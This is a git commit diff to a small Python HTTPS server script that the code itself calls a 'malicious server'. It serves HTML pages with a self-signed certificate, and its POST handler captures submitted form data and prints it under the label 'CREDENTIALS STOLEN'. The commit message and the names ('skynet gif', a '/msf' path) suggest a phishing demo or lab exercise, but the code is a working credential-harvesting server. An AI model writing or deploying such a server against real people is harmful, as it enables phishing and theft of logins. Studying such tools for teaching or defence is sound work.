ec30ffd2f8767555d161d8a0d5e997b265db5605
Kevin Seldomridge <kevin.seldomridge@gmail.com>
2024-11-22 09:21:00 -0500

    Updated attacked submit page to show skynet gif

--- leplusorg/simple_https.py
+++ leplusorg/simple_https.py
@@ -4,13 +4,24 @@ import os
 
 class myHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        if self.path == '/msf':
+        if self.path == '/':
             self.path = '/index.html'
-        
+        self.serve_file()
+
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        print("CREDENTIALS STOLEN: " + post_data.decode('utf-8'))
+        print("42")
+        self.path = '/submit.html'
+        self.serve_file()
+
+    def serve_file(self):
         try:
             file_path = self.path[1:]  # Remove leading '/'
-            print(f"Requested file: {file_path}")  # Log the requested file path
+            print(f"Attempting to serve file: {file_path}")  # Debugging line
             if os.path.exists(file_path):
+                print(f"File found: {file_path}")  # Debugging line
                 self.send_response(200)
                 if file_path.endswith('.html'):
                     self.send_header('Content-type', 'text/html')
@@ -26,18 +37,11 @@ class myHandler(BaseHTTPRequestHandler):
                 with open(file_path, 'rb') as file:
                     self.wfile.write(file.read())
             else:
-                print(f"File not found: {file_path}")  # Log file not found
+                print(f"File not found: {file_path}")  # Debugging line
                 self.send_error(404, 'File Not Found: %s' % self.path)
         except Exception as e:
-            print(f"Error serving file: {e}")  # Log the error
+            print(f"Error serving file: {str(e)}")  # Debugging line
             self.send_error(500, 'Internal Server Error: %s' % str(e))
-
-    def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length)
-        print("CREDENTIALS STOLEN: " + post_data.decode('utf-8'))
-        self.path = '/index.html'
-        self.do_GET()
 
 def run():
     print('starting malicious server....')
@@ -49,7 +53,7 @@ def run():
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     context.load_cert_chain(certfile='nginx-selfsigned.crt', keyfile='nginx-selfsigned.key')
 
-    # Wrap the socker with SSL
+    # Wrap the socket with SSL
     httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
 
     httpd.serve_forever()
